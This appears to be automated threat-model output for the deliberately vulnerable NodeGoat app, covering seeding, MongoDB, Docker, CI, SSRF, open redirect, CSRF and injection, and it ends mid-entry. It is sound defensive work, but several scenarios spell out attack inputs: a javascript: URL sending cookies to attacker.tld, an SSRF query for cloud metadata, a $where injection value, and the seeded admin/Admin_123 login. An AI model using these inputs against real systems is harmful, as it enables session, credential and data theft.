threats.likelihoodReason: No attacker action is even required beyond causing a restart or redeploy, but triggering a deploy normally needs some level of access to the platform.

mitigation.summary: Gate the reset/seed script so it refuses to run against a non-development database.
steps: In artifacts/db-reset.js, exit immediately unless NODE_ENV is 'development' or 'test' before calling tryDropCollection.
Remove the `postdeploy` hook from app.json line 13, or point it at an idempotent migration that only inserts missing documents.
Change the docker-compose.yml web command to run the seed only when an explicit SEED_DB flag is set.

threats.title: Seed script recreates well-known admin and user accounts with fixed passwords
threats.asset: the seeded admin account (userName "admin", isAdmin true)
threats.attackScenario: artifacts/db-reset.js:12-37 inserts a fixed USERS_TO_INSERT array containing userName "admin" with isAdmin true and a hardcoded password (with the cleartext value Admin_123 left in the adjacent comment), and app.json:13 runs this script after every production deploy, so an attacker who knows the public NodeGoat source simply logs in at /login with admin/Admin_123 and gains administrative access to all user profiles.
assumptions: The seeded credentials are not rotated or removed after the script runs in a deployed environment.
threats.impactReason: The seeded account is flagged isAdmin, giving full administrative control over the application and all stored user records.
threats.likelihoodReason: The credentials are literal values in a public repository and the deployed login page is reachable by any unauthenticated stranger.

mitigation.summary: Stop seeding fixed privileged credentials in any deployed environment.
steps: Replace the literal passwords in artifacts/db-reset.js:12-37 with values read from environment variables that have no default.
Delete the commented cleartext passwords at lines 19, 28 and 36.
Refuse to create an isAdmin account unless NODE_ENV is development or test.

threats.title: Destructive seed run leaves no attributable audit record
threats.asset: audit trail of collection drops and admin account creation
threats.attackScenario: artifacts/db-reset.js only writes console.log lines from tryDropCollection (line 43) and parseResponse (lines 52-58) with no identity, timestamp or destination database recorded, so an operator who runs `node artifacts/db-reset.js` against the production MONGODB_URI to wipe evidence of activity and reset the admin password can later deny having done so because nothing links the drop to a person or a run.
assumptions: Container stdout is not shipped to a tamper-resistant log store that would record who initiated the run.
threats.impactReason: Loss of attribution for a destructive database operation hinders incident response but does not by itself expose data.
threats.likelihoodReason: Anyone with shell access to the web container or Heroku dyno can invoke the script, and the docker-compose command already runs it routinely.

mitigation.summary: Emit an attributable, structured audit record for every seed/reset execution.
steps: Log the resolved database host and database name (never the credentials), the NODE_ENV value, the OS user and a UTC timestamp at the start of artifacts/db-reset.js.
Forward container stdout to an append-only log sink configured in docker-compose.yml so records survive container replacement.

threats.title: Unauthenticated MongoDB endpoint reachable by the seed flow can be flooded or dropped
threats.asset: availability of the nodegoat database backing the application
threats.attackScenario: Because the seed connection string in docker-compose.yml line 8 carries no credentials, an attacker with access to the mongo service on port 27017 issues `db.dropDatabase()` on nodegoat or opens connections until the server's limit is exhausted, after which the seed script's MongoClient.connect in artifacts/db-reset.js fails, the compose command loop at docker-compose.yml line 9 retries indefinitely and the application never starts.
assumptions: MongoDB authentication is not enabled on the mongo:4.4 service, as the credential-less connection string implies.
MongoDB is assumed to be running without authentication, exactly as the credential-less connection string in docker-compose.yml suggests.
threats.impactReason: Loss of the database stops both the seed step and the application, causing a full outage until the service is restored from backup.
threats.likelihoodReason: Needs network reachability to the mongo service, which docker-compose only exposes internally rather than publishing to the host. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authentication and bound resource usage on the MongoDB instance the seed flow targets.
steps: Start the mongo service in docker-compose.yml with --auth and create a seed user with write access limited to the nodegoat database.
Set a maxIncomingConnections limit in the mongo service configuration.
Add a bounded retry count to the seed/start command in docker-compose.yml so a failing connection surfaces as an error instead of an infinite loop.

threats.title: The web container resolves its database purely by the hostname 'mongo', allowing a rogue container to impersonate the database
threats.asset: nodegoat user records served to the application
threats.attackScenario: MONGODB_URI=mongodb://mongo:27017/nodegoat at docker-compose.yml:8 trusts Docker's embedded DNS name 'mongo' with no TLS certificate verification and no credentials, so an attacker who can attach a container to the same compose network (or win the name after the real mongo service stops) answers as 'mongo' on 27017 and feeds deployment-compose-web forged user and allocation documents.
assumptions: The compose network is shared with, or joinable by, containers outside the project's control on the deployment host.
threats.impactReason: A forged database can return attacker-chosen user records, enabling authentication bypass inside the application.
threats.likelihoodReason: Requires the ability to launch a container on the same Docker network, which is not available to a remote unauthenticated attacker.

mitigation.summary: Authenticate the database endpoint rather than trusting the hostname.
steps: Enable MongoDB authentication and put credentials in MONGODB_URI so the web service fails against an impostor that cannot validate them.
Enable TLS with CA verification on the connection string so the server certificate must match the expected identity.
Place web and mongo on a dedicated, non-default user-defined network declared in docker-compose.yml.

threats.title: MongoDB traffic between the web and mongo containers is unencrypted
threats.asset: nodegoat database records in transit (user documents, session-related data)
threats.attackScenario: The web service connects with MONGODB_URI=mongodb://mongo:27017/nodegoat at docker-compose.yml:8, a plaintext connection string with no tls=true, so an attacker who can sniff the default bridge network the compose project creates (for example from another container with CAP_NET_RAW or on a shared host) captures the wire protocol and reads or alters documents flowing between deployment-compose-web and deployment-compose-mongo.
assumptions: The mongo:4.4 container is not configured with a TLS certificate through an external config file not shown in the compose file.
threats.impactReason: All application data crossing the link is readable and modifiable, but only by someone already positioned on the container network.
threats.likelihoodReason: Requires an existing foothold on the Docker host or another container with packet capture rights.

mitigation.summary: Enable TLS on the MongoDB connection or confine the link to an isolated network.
steps: Configure mongod with --tlsMode requireTLS and a certificate mounted into the mongo service in docker-compose.yml.
Change MONGODB_URI on the web service to mongodb://mongo:27017/nodegoat?tls=true with the CA file supplied.
Define an explicit internal-only user-defined network for the web and mongo services rather than relying on the default bridge.

threats.title: The web container publishes port 4000 on all host interfaces with no restart or resource limits, exposing the app to direct flooding
threats.asset: availability of the NodeGoat web application on port 4000
threats.attackScenario: The web service maps "4000:4000" at docker-compose.yml:10-11 without a host-interface binding (e.g. 127.0.0.1:4000) and declares no mem_limit, cpus or restart policy, so an attacker who can reach the Docker host sends a sustained flood of requests to http://host:4000/ until the single Node process exhausts host CPU and memory and the container dies with nothing to restart it.
assumptions: No reverse proxy, WAF or rate limiter sits in front of the published port in the deployment described by this compose file.
threats.impactReason: Loss of the application service for all users until an operator manually restarts the container.
threats.likelihoodReason: The port binds to every host interface, so anyone who can route to the host can generate load without authentication.

mitigation.summary: Bind the published port narrowly and constrain container resources.
steps: Change the port mapping in docker-compose.yml to "127.0.0.1:4000:4000" and front it with a reverse proxy that applies rate limiting.
Add restart: unless-stopped plus mem_limit and cpus constraints to the web service.
Replace the shell loop in the command with a supervised start so a crashed process is restarted.

threats.title: Dockerfile base image node:12-alpine is end-of-life and ships known-vulnerable runtime packages
threats.asset: the running application container and the code and data it serves on port 4000
threats.attackScenario: The image built from Dockerfile line 1/7 pins FROM node:12-alpine, a Node.js release that stopped receiving security updates, so an attacker who reaches the exposed port 4000 service can exploit an unpatched Node.js or Alpine libcrypto/OpenSSL defect in that fixed base layer to crash or take control of the container process.
assumptions: The image is rebuilt and deployed as written, without an overriding base-image pin in CI or a registry-side rebuild onto a supported Node.js LTS tag.
threats.impactReason: An unpatched runtime defect in the base layer can yield code execution inside the container that serves the application on port 4000.
threats.likelihoodReason: The pinned tag is publicly known and unmaintained, and public exploits exist for EOL Node.js/Alpine package versions, though exploitation still requires a reachable vulnerable code path.

mitigation.summary: Move the image to a currently supported Node.js LTS base and keep it patched.
steps: Change both FROM lines in Dockerfile to a supported LTS digest-pinned tag (e.g. node:22-alpine@sha256:...).
Add an image scan step (e.g. Trivy or `docker scout`) to the existing GitHub Actions workflow so EOL or vulnerable base layers fail the build.
Schedule periodic rebuilds so the base layer picks up Alpine package fixes.

threats.title: Production hardening in the Dockerfile is left commented out, leaving app files writable by the runtime user
threats.asset: application source files and node_modules inside the container image
threats.attackScenario: Dockerfile line 15 leaves the chmod/chown hardening commented out and line 13 copies the whole repository in owned by `node`, the same user the process runs as (line 17), so an attacker who achieves any file-write primitive in the service listening on port 4000 can overwrite files such as the application entrypoint or a module under node_modules and have their code executed on the next process start.
assumptions: The container filesystem is not mounted read-only at runtime by the orchestrator.
The image is deployed as-is with line 15 still commented out.
threats.impactReason: Writable application code under the runtime user turns a limited write bug into persistent code execution inside the container.
threats.likelihoodReason: It requires the attacker to already hold a file-write primitive in the application; the misconfiguration only removes the barrier to persistence.

mitigation.summary: Make application code read-only to the runtime user and run the container with a read-only root filesystem.
steps: Uncomment and adapt the hardening line at Dockerfile:15 so the app directory is owned by root and only readable by the `node` user.
Copy application files with `COPY --chown=root:node` and ensure no write bit is granted to the runtime user.
Run the container with `--read-only` plus an explicit tmpfs for any writable paths the app needs.

threats.title: E2E workflow pins CI actions to mutable major-version tags
threats.asset: the e2e-test GitHub Actions runner and the repository checkout it processes
threats.attackScenario: The job references actions/checkout@v2, actions/setup-node@v1 and actions/cache@v2 by floating tag (.github/workflows/e2e-test.yml:16, 21, 26) rather than by commit SHA, so an attacker who compromises one of those action repositories or their release tags can repoint the tag to malicious code that executes on the ubuntu-latest runner during every push and pull_request run and exfiltrates the runner's GITHUB_TOKEN and environment.
assumptions: The workflow is executed as written on GitHub-hosted runners without an organisation policy that forces SHA-pinned actions.
threats.impactReason: Arbitrary code on the runner exposes the workflow token and any secrets available to the job, and can tamper with build artefacts.
threats.likelihoodReason: Depends on upstream compromise of widely-audited first-party actions, which is uncommon but has precedent in the Actions ecosystem.

mitigation.summary: Pin every action to a full commit SHA and upgrade the outdated action versions.
steps: Replace `actions/checkout@v2`, `actions/setup-node@v1` and `actions/cache@v2` in .github/workflows/e2e-test.yml with current major versions pinned to full 40-character commit SHAs.
Add Dependabot with `package-ecosystem: github-actions` so pinned SHAs are updated through reviewed pull requests.
Set a minimal `permissions:` block on the job so a compromised action receives a read-only GITHUB_TOKEN.

threats.title: E2E workflow triggers on pull_request and restores an attacker-influenced npm/build cache
threats.asset: the CI build output and the runner environment of the e2e-test job
threats.attackScenario: The e2e-test job runs on every `push` and `pull_request` (.github/workflows/e2e-test.yml:2) and restores `~/.npm` and `~/.cache` via actions/cache@v2 with a key derived only from OS, node version and package-lock.json hash (lines 25-31), so an attacker who opens a pull request from a branch in the repository can poison those cache entries with tampered tarballs and have `npm ci` on line 35 install them into subsequent runs of the same key.
assumptions: Contributors can push branches to the repository so their workflow runs share the default-branch cache scope rather than being restricted to fork caches.
threats.impactReason: A poisoned npm cache lets attacker-controlled code execute in later CI runs of the same job, affecting build and test results.
threats.likelihoodReason: Requires branch push access or cache-scope sharing; fork pull requests are isolated to their own cache scope by default.

mitigation.summary: Use integrity-verified dependency installation and restrict cache reuse for untrusted triggers.
steps: Replace the manual actions/cache@v2 block with `actions/setup-node`'s built-in `cache: npm` and a modern action version, which keys on the lockfile and validates integrity.
Rely on `npm ci` integrity hashes from package-lock.json and avoid caching `~/.cache` wholesale.
Split untrusted `pull_request` runs so they do not write cache entries that `push` runs on protected branches will restore.

threats.title: Session cookie and login credentials of the End User are exposed over plaintext HTTP, enabling session hijacking
threats.asset: session cookie and login credentials of the browser user
threats.attackScenario: server.js:145 serves the app with http.createServer (the https variant is commented out) and the express-session config at server.js:78-102 leaves the cookie block commented out so no `secure` or `httpOnly` flag is set, so an attacker on the same Wi-Fi as the End User captures the POST /login body and the connect.sid cookie in cleartext and replays the cookie to impersonate that user on /profile and /allocations.
assumptions: No TLS termination exists anywhere in front of nodegoat-web, so credentials and session cookies are assumed to travel in plaintext.
The application is deployed as written, behind no TLS-terminating reverse proxy.
threats.impactReason: A captured cookie or password grants full access to the victim's SSN, date of birth and bank account/routing numbers held in the profile.
threats.likelihoodReason: Any network-path observer (shared Wi-Fi, proxy) can read the traffic; no attacker privilege is required. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Terminate TLS and harden the session cookie so credentials and the session id never travel in the clear.
steps: Uncomment the https.createServer block at server.js:149-155 and drop the plaintext http.createServer listener, or place the app behind a TLS-terminating proxy and set app.set('trust proxy', 1).
Enable the cookie options already stubbed at server.js:92-100: cookie: { httpOnly: true, secure: true, sameSite: 'lax', maxAge: ... }.
Add HSTS via the helmet dependency already present in package.json.

threats.title: SSRF via attacker-controlled url parameter on GET /research reaches internal services
threats.asset: internal network responses (e.g. cloud metadata credentials) fetched by the server and returned to the caller
threats.attackScenario: app/routes/research.js:15 concatenates req.query.url with req.query.symbol and passes the result straight to needle.get with no host allow-list, so an attacker requests GET /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol=role and the server fetches the cloud metadata endpoint and writes the body into the response at line 25.
threats.impactReason: The server-side fetch reaches localhost and link-local addresses unreachable from outside, and the raw body is echoed back, exposing internal admin endpoints or instance credentials.
threats.likelihoodReason: The url parameter is a plain hidden form field on /research, overridable by any unauthenticated visitor with a single crafted query string.

mitigation.summary: Fix the upstream host in server code and pass only the validated symbol.
steps: Remove req.query.url from app/routes/research.js:15 and hardcode the base URL https://finance.yahoo.com/quote/.
Validate req.query.symbol against /^[A-Za-z.-]{1,10}$/ and encodeURIComponent it before concatenation.
If multiple upstreams are ever needed, resolve the host and check it against an allow-list of permitted domains, rejecting private and link-local IP ranges.
Remove the hidden url input from app/views/research.html:17.

threats.title: Third-party response body echoed unsanitised as text/html from /research
threats.asset: authenticated user sessions on the application origin
threats.attackScenario: Because app/routes/research.js:15 lets the caller pick the host, an attacker hosts a page containing <script>fetch('/profile')...</script>, sends a victim a link to GET /research?url=https://attacker.test/&symbol=x, and research.js writes the attacker's body verbatim with Content-Type text/html at lines 18-25, running attacker script on the application's own origin against the victim's session cookie.
assumptions: Session cookies are not marked HttpOnly or are usable by same-origin script for authenticated actions.
threats.impactReason: Script executes on the application origin, allowing session theft and authenticated actions as the victim.
threats.likelihoodReason: Requires the victim to click a crafted /research link, but the link needs no authentication of the attacker and the payload is fully attacker-hosted.

mitigation.summary: Never relay a remote body as HTML on the application origin.
steps: Parse the fetched document server-side in app/routes/research.js and render only extracted fields through the research.html template instead of res.write(body).
If the raw body must be shown, send it as Content-Type text/plain and escape it.
Restrict the fetch to the fixed finance.yahoo.com base URL so attacker-controlled origins cannot be proxied.

threats.title: Slow or huge attacker-chosen upstream ties up /research request handling
threats.asset: availability of the Express request handlers and server memory
threats.attackScenario: needle.get at app/routes/research.js:16 is called with no timeout or response size limit on a URL the caller supplies, so an attacker issues many concurrent GET /research?url=http://attacker.test/slowloris&symbol=x requests against a server that trickles bytes forever, exhausting sockets and memory on the Node process.
assumptions: No reverse proxy in front of the application caps request duration or concurrent connections.
threats.impactReason: The single Node process stalls on outbound sockets and buffers unbounded bodies, degrading the whole application for all users.
threats.likelihoodReason: Unauthenticated callers control the upstream URL, though the attacker must sustain many concurrent requests to exhaust resources.

mitigation.summary: Bound the outbound fetch and restrict its destination.
steps: Pass { open_timeout: 3000, response_timeout: 5000, read_timeout: 5000 } to needle.get in app/routes/research.js:16.
Cap the accepted response size and abort beyond it before writing to the response.
Hardcode the upstream host so only finance.yahoo.com can be contacted.

threats.title: Open redirect on GET /learn sends users to attacker-controlled sites
threats.asset: user trust in the redirect destination (credentials phished on the spoofed site)
threats.attackScenario: app/routes/index.js:72 passes req.query.url straight to res.redirect with no allow-list, so an attacker mails a link such as https://nodegoat.example/learn?url=https://nodeg0at-login.attacker.tld, the victim sees the trusted host in the link, and the browser lands on a cloned login page that harvests their NodeGoat credentials.
threats.impactReason: Victims can be phished or driven to malware while believing they are on the application's domain; the application's own data is not directly read, but account credentials can be captured.
threats.likelihoodReason: The redirect requires only a crafted query string and any logged-in victim clicking the link; the tutorial page even documents the exact exploit URL.

mitigation.summary: Replace the raw url parameter with a server-side mapping to an allow-list of destinations.
steps: In app/routes/index.js:70-73, look up req.query.url in a fixed object of permitted learning-resource URLs and redirect only to the matched value.
Return 400 (or redirect to /dashboard) when the parameter is absent or not in the map.
Never pass a raw request value to res.redirect anywhere in app/routes.

threats.title: Unvalidated url parameter on /learn allows javascript:/data: scheme and header-splitting payloads
threats.asset: user trust in the redirect destination and the victim's authenticated session in the browser
threats.attackScenario: GET /learn at app/routes/index.js:70 reads req.query.url with no validation library or scheme check, so an attacker sends /learn?url=javascript:fetch('https://attacker.tld/?c='+document.cookie) or a data: URL and, in browsers that follow such Location values, script runs in the victim's context and exfiltrates the session cookie.
assumptions: No upstream middleware normalises or restricts the scheme of req.query.url before the handler runs.
threats.impactReason: A successful scheme abuse yields session cookie theft or arbitrary content rendered under the trusted origin's link.
threats.likelihoodReason: Trivial to attempt but modern browsers block javascript:/data: in Location headers, so exploitation depends on the victim's client.

mitigation.summary: Validate the redirect parameter's scheme and host before use.
steps: Parse req.query.url with the Node URL constructor in app/routes/index.js:70 and reject anything whose protocol is not http: or https:.
Prefer an allow-list mapping so the raw string never reaches res.redirect.

threats.title: MongoDB reachable without authentication from any container on the compose network
threats.asset: user documents including plaintext passwords, SSN and bank account data
threats.attackScenario: docker-compose.yml:8 sets MONGODB_URI to mongodb://mongo:27017/nodegoat with no username or password and the mongo:4.4 service at line 13 starts with no --auth, so anyone who reaches port 27017 on that network — for example after gaining code execution through the $where injection or by attaching a container — connects with a mongo shell and dumps or drops the users collection.
assumptions: MongoDB is assumed to be running without authentication, exactly as the credential-less connection string in docker-compose.yml suggests.
Network access to the mongo service is not restricted beyond the compose network.
The mongod process is started without authentication enabled, as no credentials appear in the connection string or the compose service definition.
threats.impactReason: Unauthenticated database access exposes and allows modification or deletion of every collection, including plaintext passwords, SSN and bank account fields.
threats.likelihoodReason: Port 27017 is only exposed inside the compose network, so an attacker needs a foothold on that network or a deployment that publishes the port. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enable MongoDB authentication and supply credentials through MONGODB_URI.
steps: Add MONGO_INITDB_ROOT_USERNAME/PASSWORD to the mongo service in docker-compose.yml and start mongod with --auth.
Create a least-privilege application user limited to the nodegoat database and put its credentials in MONGODB_URI (docker-compose.yml:8), sourced from a secret rather than inline.
Keep the fallback in config/env/all.js:3 pointed at a local development instance only and fail fast when MONGODB_URI is unset in production.

threats.title: Server-side JavaScript injection into MongoDB via $where in allocations-dao
threats.asset: user documents including plaintext passwords, SSN and bank account data in the nodegoat database
threats.attackScenario: app/data/allocations-dao.js:77 interpolates a request-supplied value into a MongoDB $where JavaScript expression, so an attacker calls the allocations route with a threshold value like 0; return this.userId >= 0 (or a while(true) loop) and makes the database evaluate attacker JavaScript that returns every user's allocation documents or pins the mongod query thread.
assumptions: The interpolated value in allocations-dao.js:77 originates from an HTTP request parameter.
threats.impactReason: $where executes inside the database engine with full read access to the collections, exposing user documents holding plaintext passwords, SSN and bank data, and allowing a blocking loop that denies service.
threats.likelihoodReason: Any logged-in user reaching the allocations page can supply the value, and the injection needs only a crafted query string.

mitigation.summary: Remove the $where clause and express the filter with native query operators.
steps: Rewrite the query at app/data/allocations-dao.js:77 to use {"stocks": {"$gt": Number(threshold)}} style operators instead of a $where string.
Coerce the incoming value with Number() and reject NaN before it reaches the DAO.
Disable server-side JavaScript on the mongod instance (--noscripting) in docker-compose.yml.

threats.title: No database-side audit trail for changes to allocations, benefits and user records
threats.asset: integrity evidence for allocation, contribution and benefit records
threats.attackScenario: The mongod service in docker-compose.yml:13 runs the stock mongo:4.4 image with no auditing or profiling configured and the application connects as a single shared, credential-less identity, so a user who abuses the $where injection in app/data/allocations-dao.js:77 to update another user's allocation leaves no per-actor record and the change cannot be attributed or disputed afterwards.
assumptions: MongoDB auditing or profiling is not enabled on the mongo:4.4 instance.
MongoDB is assumed to be running without authentication, exactly as the credential-less connection string in docker-compose.yml suggests.
The application uses a single shared database identity for all end users.
threats.impactReason: Fraudulent changes to retirement allocation and contribution records cannot be attributed to an actor, blocking incident response and dispute resolution.
threats.likelihoodReason: Requires an attacker to already reach the data layer, but the absence of logging is a standing condition on every write. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enable database-side change auditing and application-level write logging.
steps: Turn on MongoDB auditing (or at minimum the database profiler for writes) in the mongo service defined in docker-compose.yml.
Log actor id, collection, document id and timestamp for every mutating DAO call in app/data/*.js to an append-only sink.
Give the application a dedicated database user so audit entries carry a meaningful principal.

threats.title: Vulnerable mongodb 2.2.36 driver allows denial of service against the database connection
threats.asset: availability of the nodegoat MongoDB data access layer
threats.attackScenario: package.json:18 pins mongodb@^2.1.18 resolving to 2.2.36, which is affected by GHSA-mh5c-679w-hh4r; an attacker sends the input pattern that triggers the driver's denial-of-service path through any data-backed route (for example the allocations or memos pages) and the Node process's database client stalls, cutting off all collections for every user.
threats.impactReason: Loss of the driver blocks all reads and writes of users, allocations, contributions, benefits and memos until the process is restarted.
threats.likelihoodReason: The vulnerable version is pinned and reachable through ordinary authenticated routes, though the trigger requires a specific crafted input.

mitigation.summary: Upgrade the MongoDB driver past the fixed version.
steps: Raise the mongodb dependency in package.json:18 to at least 3.1.13 (preferably a current 4.x/5.x release).
Update the MongoClient.connect call in server.js:30 to the callback/promise signature required by the newer driver.
Re-run the application's Cypress suite to confirm the DAO layer still functions.

threats.title: No CSRF protection on state-changing POST routes lets an external site rewrite a victim's profile and contributions
threats.asset: user profile records (SSN, date of birth, bank account and routing numbers) and contribution percentages
threats.attackScenario: An attacker hosts a page containing a hidden form that auto-submits to https://nodegoat.example/profile with attacker-chosen bankAcc and bankRouting values; a logged-in victim visiting the page has their express-session cookie attached automatically because csurf is not mounted (server.js:104-113 keeps app.use(csrf()) commented out), and the victim's banking details are overwritten.
assumptions: The session cookie is sent on cross-site form POSTs because no SameSite attribute is configured on the express-session cookie.
threats.impactReason: An attacker can silently change a victim's bank account and routing number and contribution allocations, redirecting retirement money.
threats.likelihoodReason: csurf is declared as a dependency but never mounted, and the state-changing POST routes accept urlencoded form bodies that any external page can submit.

mitigation.summary: Mount csurf and emit a token in every state-changing form.
steps: Uncomment app.use(csrf()) and the res.locals.csrftoken middleware in server.js:104-113 (csurf is already a dependency in package.json).
Add a hidden _csrf input rendered from {{csrftoken}} to the login, signup, profile, contributions, benefits and memos templates in app/views.
Set cookie: { sameSite: 'lax', httpOnly: true } on the express-session options in server.js:78.

threats.title: Open redirect on GET /learn sends authenticated users to attacker-controlled sites
threats.asset: user credentials and session state harvested through phishing on a trusted link
threats.attackScenario: An attacker sends a victim a link to https://nodegoat.example/learn?url=https://evil.example/login; the handler at app/routes/index.js:70-72 calls res.redirect(req.query.url) with no allow-list, so the victim lands on a cloned NodeGoat login page from a trusted-looking origin and submits their username and password.
threats.impactReason: Credential phishing and token leakage via the trusted domain, though the app's own data is not directly read.
threats.likelihoodReason: The redirect target is a plain query parameter and the route only requires a logged-in session, which any self-registered user has.

mitigation.summary: Restrict /learn redirects to an allow-list of known learning-resource URLs or relative paths.
steps: In app/routes/index.js:70 map a short identifier (e.g. ?topic=a1) to a hardcoded URL table instead of accepting req.query.url.
If an absolute URL must be accepted, parse it and reject any host not in a configured allow-list before calling res.redirect.

threats.title: Unauthenticated brute force of POST /login against plaintext-compared passwords
threats.asset: user accounts and the SSN, DOB and bank details behind them
threats.attackScenario: An attacker scripts thousands of POST /login requests against app/routes/index.js:34; the handler in app/routes/session.js:53 returns the distinct messages "Invalid username" and an invalid-password message, letting the attacker first enumerate valid usernames and then guess passwords that validateLogin compares with a plain string equality until a session is established.
assumptions: No rate limiting or lockout is applied, so login and signup are assumed to be brute-forceable without restriction.
No rate limiting, account lockout or CAPTCHA is applied in front of POST /login by the application or any fronting proxy.
threats.impactReason: A guessed password grants full access to the victim's stored SSN, date of birth and bank account and routing numbers.
threats.likelihoodReason: POST /login is reachable by any unauthenticated stranger, and the differentiated error messages make username enumeration cheap before guessing begins. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Throttle authentication attempts and return an identical error for both failure modes.
steps: Return the shared errorMessage constant for both err.noSuchUser and err.invalidPassword branches in app/routes/session.js:82-95, as the commented fix indicates.
Add per-IP and per-username rate limiting plus temporary lockout in front of app.post("/login") in app/routes/index.js:34.
Store passwords with bcrypt-nodejs (already a dependency) instead of the plaintext comparison in app/data/user-dao.js.

threats.title: Server-side JavaScript injection via eval() of contribution fields on POST /contributions
